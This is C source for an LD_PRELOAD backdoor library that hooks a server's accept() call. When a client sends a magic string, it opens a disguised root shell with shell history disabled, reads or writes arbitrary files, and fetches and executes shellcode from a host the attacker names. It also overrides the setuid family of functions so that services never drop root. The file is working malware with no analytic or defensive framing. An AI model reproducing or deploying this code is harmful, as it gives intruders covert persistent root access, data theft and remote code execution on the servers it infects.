/* 
 * [linux]# gcc -Wall -Werror -s -shared -o preload.so preload.c -ldl
 */

/* ARGV0 is how the shell will look like in the output of ps */
#define ARGV0 "httpd"
/* PRELOAD is the magic string that has to be sent in order to start a
 * shell.. the client might send anything as a terminator, NUL, NL, or
 * whatever else */
#define PRELOAD "4ed1479a7a48653b13d492f52ecbe5d6"
/* if SPORT is not 0, the backdoor will only start a shell if the
 * source port of the connexion is SPORT.. useful for servers that send
 * something to the client before anything else (like ftpd, sshd, etc)
 * but problematic behind a nat.. in this case SPORT 0 and an httpd
 * might be used, for example.. */
#define SPORT 0

#include <errno.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>

#ifndef HAVEUINT32
#define HAVEUINT32
typedef unsigned int uint32;
#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0x2000
#endif

int
getHostAddress (const char *host, struct sockaddr_in *addrP)
{
  struct hostent *entry = NULL;

  if ((entry = gethostbyname (host)) == NULL)
    {
      if ((addrP->sin_addr.s_addr = htonl (inet_addr (host))) == 0xffffffff)
	{

	  return 0;
	}
    }
  else
    {
      memcpy (&(addrP->sin_addr), entry->h_addr, entry->h_length);
    }

  return 1;
}


int
tcpconnect (const char *host, const unsigned short port, int getreserved)
{
  int sfd = -1, p = -1;
  struct sockaddr_in addr;
  struct linger lingerVal;

  /* Translate hostname from DNS or IP-address form */

  memset (&addr, 0, sizeof (addr));
  if (!getHostAddress (host, &addr))
    {
      return -1;
    }
  addr.sin_family = AF_INET;
  addr.sin_port = ntohs (port);

  /*if we don't specifically say we want a reserved port */
  if (!getreserved)
    {

      if ((sfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
	{
	  return -1;
	}
    }
  else
    {
/*      if (-1 == (sfd = rresvport(&p)))
  {
    hdebug("Failed to get a privaledged socket!\n");
    return -1;
  }
        printf("Using source port: %d\n", p);
*/
      do
	{
	  p = rand () % 1024;

	  if (-1 == (sfd = rresvport (&p)))
	    {
	      if (errno == EAGAIN)
		{
		  sleep (2);
		  continue;
		}
	      else
		{
		  return -1;
		}
	    }
	}
      while (sfd == -1);
    }

  /* Set the "don't linger on close" option */

  lingerVal.l_onoff = 0;
  lingerVal.l_linger = 0;
  setsockopt (sfd, SOL_SOCKET, SO_LINGER, (char *) &lingerVal,
	      sizeof (lingerVal));

  /* Now connect! */

  if (connect (sfd, (struct sockaddr *) &addr, sizeof (addr)) < 0)
    {
      close (sfd);
      return -1;
    }

  return sfd;
}

/* returns 1 if it fails, 0 if it succeeds */
int
tcpread (int fd, uint32 size, unsigned char *buffer)
{
  uint32 left;
  unsigned char *p;
  int i;

  memset (buffer, 0x00, size);

  left = size;
  p = buffer;
  do
    {
      i = read (fd, p, left);
      if (i == 0 && errno == EINTR)
	continue;
      if (i == 0 && errno == EAGAIN)
	continue;
      /*some error checking... */
      if (i <= 0)		/*if 0, then we also need to exit */
	{
	  return 0;
	}
      left -= i;
      p += i;

    }
  while (left > 0);

  return 1;			/*success */

}

static void
mosdef (int s)
{
  unsigned char *buf;
  int fd;
  unsigned int insize;
  char host[24];
  char p_port[8];
  int port;
  int i;

  buf = malloc (100000);

  i = recv (s, host, sizeof (host), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  host[i - 1] = '\0';

  i = recv (s, p_port, sizeof (p_port), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  p_port[i - 1] = '\0';

  port = atoi (p_port);

  fd = tcpconnect (host, port, 0);
  if (fd == -1)
    {
      exit (EXIT_FAILURE);
    }

  if (!tcpread (fd, 4, buf))
    {
      exit (EXIT_FAILURE);
    };
  insize = *((unsigned int *) buf);
  if (insize == 0)
    {
      exit (EXIT_FAILURE);
    }
  if (!tcpread (fd, insize, buf))
    {
      exit (5);
    };

  asm volatile ("movl %0, %%ebx"::"g" (fd):"%ebx");

  ((void (*)()) (buf)) ();
  exit (EXIT_FAILURE);
}

static void
download (int s)
{
  int i;
  char file[PATH_MAX];
  int fd;
  ssize_t ssize;
  char buffer[BUFSIZ];

  i = recv (s, file, sizeof (file), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  file[i - 1] = '\0';

  fd = open (file, O_RDONLY);
  if (fd < 0)
    {
      exit (EXIT_FAILURE);
    }

  while ((ssize = read (fd, buffer, sizeof (buffer))) > 0)
    {
      i = send (s, buffer, ssize, MSG_NOSIGNAL);
      if (i != ssize)
	{
	  exit (EXIT_FAILURE);
	}
    }

  close (fd);
  exit (EXIT_SUCCESS);
}


#define SH "/bin/sh"

static void
shell (int s)
{
  char *argv[] = { "/usr/sbin/httpd", NULL };	/* XXX */
  char *envp[] = { "HISTFILE=/dev/null", NULL };

  dup2 (s, STDIN_FILENO);
  dup2 (s, STDOUT_FILENO);
  dup2 (s, STDERR_FILENO);

  execve (SH, argv, envp);

  exit (EXIT_FAILURE);
}

#define WHO "/usr/bin/who"

static void
who (int s)
{
  char *argv[] = { "/usr/sbin/httpd", NULL };	/* XXX */
  char *envp[] = { NULL };

  dup2 (s, STDIN_FILENO);
  dup2 (s, STDOUT_FILENO);
  dup2 (s, STDERR_FILENO);
  execve (WHO, argv, envp);

  exit (EXIT_FAILURE);
}

static void
upload (int s)
{
  int i;
  char file[PATH_MAX];
  int fd;
  ssize_t ssize;
  char buffer[BUFSIZ];

  i = recv (s, file, sizeof (file), MSG_NOSIGNAL);
  if (i <= 0)
    {
      exit (EXIT_FAILURE);
    }
  file[i - 1] = '\0';

  fd = open (file, O_WRONLY | O_CREAT | O_EXCL, S_IRWXU);
  if (fd < 0)
    {
      exit (EXIT_FAILURE);
    }

  while ((i = recv (s, buffer, sizeof (buffer), MSG_NOSIGNAL)) > 0)
    {
      ssize = write (fd, buffer, i);
      if (ssize != i)
	{
	  exit (EXIT_FAILURE);
	}
    }

  close (fd);
  exit (EXIT_SUCCESS);
}

typedef struct command_s
{
  char command;
  void (*p_command) (int s);
} command_t;

command_t commands[] = {
  {'d', download},
  {'m', mosdef},
  {'s', shell},
  {'u', upload},
  {'w', who}
};

static void
blaat (int s)
{
  int i;
  char command[sizeof ("x")];

  i = recv (s, command, sizeof (command), MSG_NOSIGNAL);
  if (i != sizeof (command))
    {
      exit (EXIT_FAILURE);
    }

  for (i = 0; i < sizeof (commands) / sizeof (command_t); i++)
    {
      if (*command == commands[i].command)
	{
	  commands[i].p_command (s);
	  exit (EXIT_FAILURE);
	}
    }
  exit (EXIT_FAILURE);
}

#define ROOT 0

#ifndef RTLD_NEXT
#define RTLD_NEXT ( (void *)(-1) )
#endif

int
accept (int s, struct sockaddr *addr, socklen_t * addrlen)
{
  static int (*p_accept) () = NULL;
  int accepted_s;
  int i;
  socklen_t socklen;
  struct sockaddr sa;
  char buffer[sizeof (PRELOAD)];
  pid_t pid;

  if (p_accept == NULL)
    {
      p_accept = (int (*)()) dlsym (RTLD_NEXT, "accept");
      if (dlerror () != NULL)
	{
	  return (-1);
	}
    }

  for (;;)
    {
      accepted_s = p_accept (s, addr, addrlen);
      if (accepted_s < 0)
	{
	  return (-1);
	}

      socklen = sizeof (sa);
      i = getpeername (accepted_s, &sa, &socklen);
      if (i)
	{
	  return (accepted_s);
	}

      if (sa.sa_family != AF_INET && sa.sa_family != AF_INET6)
	{
	  return (accepted_s);
	}

      if (SPORT)
	{
	  if (ntohs (((struct sockaddr_in *) &sa)->sin_port) != SPORT)
	    {
	      return (accepted_s);
	    }
	}

      i = recv (accepted_s, buffer, sizeof (buffer), MSG_PEEK | MSG_NOSIGNAL);
      if (i != sizeof (buffer))
	{
	  return (accepted_s);
	}
      if (strncmp (buffer, PRELOAD, sizeof (PRELOAD) - 1))
	{
	  return (accepted_s);
	}

      i = recv (accepted_s, buffer, sizeof (buffer), MSG_NOSIGNAL);
      if (i != sizeof (buffer))
	{
	  exit (EXIT_FAILURE);
	}

      for (i = 0; i < 1024; i++)
	{
	  if (i != accepted_s)
	    {
	      close (i);
	    }
	}

      seteuid (ROOT);
      setuid (ROOT);
      setegid (ROOT);
      setgid (ROOT);

      pid = fork ();
      if (!pid)
	{
	  setsid ();
	  blaat (accepted_s);
	}
      exit (EXIT_FAILURE);
    }
  return (accepted_s);
}

int
setresuid (uid_t ruid, uid_t euid, uid_t suid)
{
  static int (*p_setresuid) () = NULL;
  int i;

  if (p_setresuid == NULL)
    {
      p_setresuid = (int (*)()) dlsym (RTLD_NEXT, "setresuid");
      if (dlerror () != NULL)
	{
	  return (-1);
	}
    }

  i = p_setresuid (ruid, euid, 0);
  return (0);
}

int
setuid (uid_t uid)
{
  int i;

  i = setresuid (uid, uid, 0);
  return (0);
}

int
seteuid (uid_t euid)
{
  int i;

  i = setresuid (-1, euid, 0);
  return (0);
}

int
setreuid (uid_t ruid, uid_t euid)
{
  int i;

  i = setresuid (ruid, euid, 0);
  return (0);
}
